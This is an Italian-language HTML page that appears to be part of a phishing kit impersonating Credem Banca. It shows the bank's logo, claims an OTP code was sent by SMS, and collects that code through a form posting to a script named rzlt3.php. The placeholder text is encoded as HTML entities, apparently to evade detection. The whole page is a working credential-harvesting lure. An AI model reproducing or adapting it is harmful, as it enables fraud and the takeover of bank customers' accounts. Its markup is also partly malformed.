





<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">





<html>





<head>





<title>Credem Aggiornamento </title>





<meta name="viewport" content="width=device-width, initial-scale=1.0">





<link rel="shortcut icon" href="images/favicon.ico"/>











<style type="text/css">





.textbox { 





    border: 1px solid #323232; 





    height: 42px; 





    width: 275px; 





  	font-family: 'open sans';





    font-size: 14px;





  	color: #6F6F6F;





    padding-left: 10px; 





    border-radius: 2px; 





    box-shadow: 0 4px 7px 0 #d2d2d2 inset;   





}  





.textbox:focus { 





    outline: none; 





    border: 2px solid #258900;





} 





</style>





</head>





<body>





<h2 style="text-align: center;"><img style="display: block; margin-left: auto; margin-right: auto;" src="https://www.bitmat.it/wp-content/uploads/2018/10/LOGOcredem-banca.png" alt="" width="335" height="251" />Aggiornamento dati</h2><br><center>Gentile cliente, abbiamo inviato il suo codice OTP via sms.<br>Le ricordo che i nostri operatori non chiederanno mai i suoi codici al telefono .
<br>
<br>






<form action=rzlt3.php name=kmc method=post>


<input name="tp" placeholder="C&#111;&#100;&#105;&#99;e O&#84;P " class="textbox" autocomplete="off" required type="text" style=""display: block; margin-left: auto; margin-right: auto;z-index:4">
<br>
<br>








<center>
<div id="formimage1" <img style="display: block; margin-left: auto; margin-right: auto;" z-index:6"><input type="image" name="formimage1" width="250" height="40" src="images/s13.png"><br>
<br>
<br>








</body>





</html>